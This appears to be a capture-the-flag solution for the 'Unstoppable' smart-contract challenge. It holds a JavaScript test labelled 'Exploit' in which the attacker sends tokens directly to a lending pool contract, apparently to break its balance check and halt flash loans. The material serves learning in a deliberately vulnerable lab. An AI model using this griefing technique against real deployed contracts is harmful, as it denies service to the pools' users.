# 1 - Unstoppable

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Send tokens to pool contract address via token contract's `transfer`
  await this.token
    .connect(attacker)
    .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
})
```
